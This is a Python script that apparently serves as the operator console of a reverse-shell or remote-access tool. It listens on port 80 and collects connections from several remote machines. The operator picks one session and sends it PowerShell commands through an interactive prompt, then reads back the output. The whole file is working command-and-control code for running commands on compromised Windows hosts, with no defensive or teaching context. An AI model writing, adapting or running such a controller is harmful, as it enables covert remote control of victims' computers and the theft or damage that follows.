import socket
import sys
import time
from threading import Thread

class Server():
    def __init__(self):
        self.clients = []

    def launch(self):
        def listen():
            host, port = ('', 80)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind((host,port))
            self.s = s
            while True:
                s.listen(5)
                print(f'Listening on port {port}...')
                (client, address) = s.accept()
                print(f'\nConnected: client address => {address[0]}')
                self.clients.append((client, address))
        self.th = Thread(target=listen)
        self.th.start()

    def open_prompt(self, client):
        print('Terminal open')
        while True:
            cmd = input('Powershell>')
            if cmd != "quit":
                try:
                    client.send(cmd.encode('utf-8'))
                    ans = client.recv(1024).decode()
                    print(ans)
                except Exception as e:
                    print('except on run_tcp_server: ', e)
            else:
                self.access_manager()
                break


    def access_manager(self):
        def get_device():
            print("Select current session to manage:")
            print(str(len(self.clients)) + " devices. choose one")
            select = input('>')
            return select

        def connect():
            try:
                select = get_device()
                select = int(select)
                self.clients[select][0]
                exist = True
            except KeyboardInterrupt :
                self.s.close()
                sys.exit(1)
            except:
                exist = False

            if exist:
                self.open_prompt(self.clients[select][0])
            else:
                print('Element must exist...')
                connect()
        connect()


def main():
    try:
        server = Server()
        server.launch()
        time.sleep(.1)
        server.access_manager()
    except Exception as e:
        print(e)
        server.s.close()
        sys.exit(1)

if __name__ == "__main__":
    main()
